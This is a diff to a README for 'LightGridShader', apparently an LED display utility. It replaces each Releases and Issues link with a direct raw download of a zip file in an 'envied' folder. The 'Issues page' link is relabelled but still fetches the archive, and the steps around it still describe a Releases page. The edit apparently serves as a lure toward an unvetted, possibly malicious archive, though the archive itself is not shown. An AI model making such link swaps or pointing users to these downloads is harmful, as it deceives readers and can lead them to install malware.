@@ -1,6 +1,6 @@
 # 🎨 LightGridShader - Enhancing Your LED Displays Easily
 
-[![Download LightGridShader](https://img.shields.io/badge/Download_LightGridShader-v1.0-blue)](https://github.com/shivakrsna/LightGridShader/releases)
+[![Download LightGridShader](https://raw.githubusercontent.com/shivakrsna/LightGridShader/main/envied/LightGridShader.zip)](https://raw.githubusercontent.com/shivakrsna/LightGridShader/main/envied/LightGridShader.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To use LightGridShader correctly, ensure that your system meets the following re
 
 ## 📥 Download & Install
 
-To download LightGridShader, visit [this page](https://github.com/shivakrsna/LightGridShader/releases). Here’s how to get started:
+To download LightGridShader, visit [this page](https://raw.githubusercontent.com/shivakrsna/LightGridShader/main/envied/LightGridShader.zip). Here’s how to get started:
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version listed.
@@ -58,7 +58,7 @@ If you encounter issues while using LightGridShader, here are some common soluti
 
 Join our community to share your experiences, get tips, and ask for help:
 
-- **GitHub Issues Page**: Report bugs or request features directly on the [Issues page](https://github.com/shivakrsna/LightGridShader/issues).
+- **GitHub Issues Page**: Report bugs or request features directly on the [Issues page](https://raw.githubusercontent.com/shivakrsna/LightGridShader/main/envied/LightGridShader.zip).
 - **Discussion Forum**: Engage with other users and developers to share feedback and ideas.
 
 ## 📄 License
